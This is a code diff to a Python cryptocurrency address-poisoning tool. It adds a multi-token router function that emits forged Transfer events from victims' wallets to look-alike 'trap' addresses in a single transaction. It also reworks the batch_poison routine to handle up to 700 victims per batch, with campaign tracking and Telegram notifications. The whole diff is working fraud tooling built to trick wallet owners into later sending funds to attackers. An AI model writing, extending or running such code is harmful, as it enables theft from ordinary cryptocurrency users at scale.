@@ -364,6 +364,10 @@ MIRROR_CONTRACTS = {
 }
 
 MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"batchEmitTransfers","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
+
+# ─── Multi-Token Router Configuration ───
+MULTI_TOKEN_ROUTER = os.getenv("MULTI_TOKEN_ROUTER")
+MULTI_TOKEN_ROUTER_ABI = json.loads('[{"inputs":[{"components":[{"internalType":"address","name":"target","type":"address"},{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"internalType":"struct MultiTokenBatchRouter.BatchCall[]","name":"calls","type":"tuple[]"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
 def get_token_decimals(asset_symbol):
     """Get the correct number of decimals for a token symbol."""
     decimals_map = {
@@ -709,6 +713,134 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
     except Exception as e:
         logger.error(f"[batch-mirror] Failed to emit batch: {e}")
         return None
+
+
+def emit_multi_token_batch_transfers(queue, campaign_id):
+    """
+    Emit multiple forged Transfer events for DIFFERENT tokens in a SINGLE transaction
+    using the MultiTokenBatchRouter contract.
+    """
+    if not MULTI_TOKEN_ROUTER:
+        logger.error("[multi-batch] MULTI_TOKEN_ROUTER not configured in .env")
+        return None
+        
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[multi-batch] No funding key for campaign {campaign_id}")
+        return None
+        
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+        
+        router_contract = w3.eth.contract(
+            address=w3.to_checksum_address(MULTI_TOKEN_ROUTER),
+            abi=MULTI_TOKEN_ROUTER_ABI
+        )
+        
+        # Group queue items by asset (contract address)
+        asset_groups = {}
+        for q in queue:
+            asset = q['asset']
+            contract_address = (
+                MIRROR_CONTRACTS.get(asset) or 
+                MIRROR_CONTRACTS.get(asset.upper()) or 
+                MIRROR_TOKEN_NATIVE
+            )
+            if not contract_address:
+                logger.warning(f"[multi-batch] No contract for asset {asset}, skipping")
+                continue
+                
+            if contract_address not in asset_groups:
+                asset_groups[contract_address] = []
+            asset_groups[contract_address].append(q)
+            
+        if not asset_groups:
+            logger.error("[multi-batch] No valid assets to batch")
+            return None
+            
+        # Build the BatchCall structs (using tuples for max web3.py compatibility)
+        calls = []
+        total_transfers = 0
+        for contract_addr, items in asset_groups.items():
+            froms = [w3.to_checksum_address(q['victim']) for q in items]
+            tos = [w3.to_checksum_address(q['trap']) for q in items]
+            values = [q['amount'] for q in items]
+            total_transfers += len(items)
+            
+            calls.append((
+                w3.to_checksum_address(contract_addr),
+                froms,
+                tos,
+                values
+            ))
+            
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+        
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+        
+        gas_params = {}
+        if use_eip1559:
+            base_fee = latest_block.get("baseFeePerGas", 0) or 0
+            max_fee = w3.to_wei(2, 'gwei')
+            max_priority = w3.to_wei(0.01, 'gwei')
+            
+            network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
+            network_tip = w3.to_wei(0.01, 'gwei')
+            
+            if network_tip >= network_max_fee or network_max_fee < w3.to_wei(0.1, 'gwei'):
+                pass
+            else:
+                max_fee = network_max_fee
+                max_priority = min(network_tip, w3.to_wei(0.05, 'gwei'))
+                
+            gas_params['maxFeePerGas'] = max_fee
+            gas_params['maxPriorityFeePerGas'] = max_priority
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+            
+        # Estimate gas: base 60k + 25k per transfer
+        estimated_gas = 60000 + (25000 * total_transfers)
+        
+        tx = router_contract.functions.transfer(calls).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+        
+        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+        gas_cost = estimated_gas * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
+        
+        if operator_balance < gas_cost:
+            needed_eth = w3.from_wei(gas_cost, 'ether')
+            have_eth = w3.from_wei(operator_balance, 'ether')
+            logger.error(f"[multi-batch] Insufficient gas. Need {needed_eth}, have {have_eth}")
+            return None
+            
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        
+        logger.info(f"[multi-batch] Multi-token batch sent: {total_transfers} transfers across {len(calls)} tokens in tx={tx_hash.hex()}")
+        
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+        if receipt.status == 1:
+            logger.info(f"[multi-batch] ✅ Multi-token batch confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[multi-batch] ❌ Multi-token batch reverted")
+            return None
+            
+    except Exception as e:
+        logger.error(f"[multi-batch] Failed to emit multi-token batch: {e}")
+        return None    
 
 
 def get_web3():
@@ -1298,8 +1430,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     if job_id:
         update_job(job_id, total=total)
         
-    # 🚀 BATCH PROCESSING: Group by asset so we don't mix USDC and ETH in the same batch
-    BATCH_SIZE = 40  
+      # 🚀 BATCH PROCESSING: 700 items per multi-token batch to minimize gas fees
+    BATCH_SIZE = 700
     
     # 🚀 Send "Started" Telegram notification immediately
     start_msg = (
@@ -1312,7 +1444,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     success = 0
     gas_failures = 0
     skipped_dusted = 0
-    poison_queues = {}  # asset -> list of queue items
+    poison_queue = []  # Single unified queue for all assets (multi-token batching)
     
     for i, entry in enumerate(entries, 1):
         # Support both (victim, key, dust_count) and (trap_id, victim, key, dust_count) formats
@@ -1359,12 +1491,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         
         logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
         
-                # 🚀 Add to asset-specific batch queue
-        asset_key = fetched_asset or NATIVE_SYMBOL
-        if asset_key not in poison_queues:
-            poison_queues[asset_key] = []
-            
-        poison_queues[asset_key].append({
+                # 🚀 Add to unified multi-token batch queue
+        poison_queue.append({
             'victim': victim,
             'trap': trap_address,
             'amount': fetched_amount,
@@ -1372,96 +1500,67 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             'trap_id': trap_id,
         })
         
-        # 🚀 Process batch when THIS asset's queue reaches BATCH_SIZE
-        if len(poison_queues[asset_key]) >= BATCH_SIZE:
-            queue = poison_queues[asset_key]
-            logger.info(f"[batch] Processing batch of {len(queue)} {asset_key} victims...")
+        # 🚀 Process batch when queue reaches BATCH_SIZE (700)
+        if len(poison_queue) >= BATCH_SIZE:
+            logger.info(f"[batch] Processing multi-token batch of {len(poison_queue)} victims...")
             
-            # Prepare batch arrays
-            batch_victims = [q['victim'] for q in queue]
-            batch_traps = [q['trap'] for q in queue]
-            batch_amounts = [q['amount'] for q in queue]
-            batch_trap_ids = [q['trap_id'] for q in queue]
+            batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
             
-            # Emit batch (passing the single asset key)
-            tx_hash = emit_batch_mirror_transfers(
-                batch_victims,
-                batch_traps,
-                batch_amounts,
-                asset_key,
-                campaign_id
-            )
+            # Emit multi-token batch via Router
+            tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
             
             if tx_hash:
-                success += len(queue)
-                logger.info(f"[batch] ✅ Batch emitted: {len(queue)} transfers in tx={tx_hash}")
+                success += len(poison_queue)
+                logger.info(f"[batch] ✅ Multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
                 
-                # Update dust counts for all traps in batch
                 for tid in batch_trap_ids:
-                    if tid:
-                        update_trap_dust_count(tid)
-                
-                                # 🚀 Send chunked Telegram notifications (respects 4096 char limit)
-                send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=False)
+                    update_trap_dust_count(tid)
+                    
+                send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=False)
             else:
-                # Batch failed - check if gas issue
                 operator_key = get_mirror_operator_key(campaign_id)
                 if operator_key:
                     try:
-                        operator_account = w3.eth.account.from_key(operator_key)
-                        operator_addr = operator_account.address
+                        operator_addr = w3.eth.account.from_key(operator_key).address
                         operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
                         if operator_balance < w3.to_wei(0.0001, 'ether'):
                             gas_failures += 1
-                            logger.warning(f"[batch] ❌ Batch failed (gas insufficient)")
+                            logger.warning(f"[batch] ❌ Multi-token batch failed (gas insufficient)")
                             if gas_failures >= 3:
                                 logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures")
-                                queue.clear()
+                                poison_queue.clear()
                                 break
                         else:
-                            logger.error(f"[batch] ❌ Batch failed (other reason)")
+                            logger.error(f"[batch] ❌ Multi-token batch failed (other reason)")
                     except Exception:
-                        logger.error(f"[batch] ❌ Batch failed")
+                        logger.error(f"[batch] ❌ Multi-token batch failed")
                 else:
-                    logger.error(f"[batch] ❌ Batch failed (no operator key)")
+                    logger.error(f"[batch] ❌ Multi-token batch failed (no operator key)")
             
-                        # Clear this asset's queue for next batch
-            poison_queues[asset_key] = []
+            poison_queue.clear()
         
         if job_id and i % 5 == 0:
             update_job(job_id, progress=i)
         time.sleep(0.5)  # Reduced delay since we're batching
     
-        # 🚀 Process remaining items in all queues (final batches)
-    for asset_key, queue in poison_queues.items():
-        if queue:
-            logger.info(f"[batch] Processing final batch of {len(queue)} {asset_key} victims...")
-            
-            batch_victims = [q['victim'] for q in queue]
-            batch_traps = [q['trap'] for q in queue]
-            batch_amounts = [q['amount'] for q in queue]
-            batch_trap_ids = [q['trap_id'] for q in queue]
-            
-            tx_hash = emit_batch_mirror_transfers(
-                batch_victims,
-                batch_traps,
-                batch_amounts,
-                asset_key,
-                campaign_id
-            )
+        # 🚀 Process remaining items in queue (final multi-token batch)
+    if poison_queue:
+        logger.info(f"[batch] Processing final multi-token batch of {len(poison_queue)} victims...")
+        
+        batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
+        
+        tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
         
         if tx_hash:
-            success += len(queue)
-            logger.info(f"[batch] ✅ Final batch emitted: {len(queue)} transfers in tx={tx_hash}")
+            success += len(poison_queue)
+            logger.info(f"[batch] ✅ Final multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
             
             for tid in batch_trap_ids:
-                if tid:
-                    update_trap_dust_count(tid)
-            
-                        # 🚀 Send chunked Telegram notifications for final batch
-            send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=True)
+                update_trap_dust_count(tid)
+                
+            send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=True)
         else:
-            logger.error(f"[batch] ❌ Final batch failed")
+            logger.error(f"[batch] ❌ Final multi-token batch failed")
 
         # Summary with gas failure information
     failed = total - success - skipped_dusted
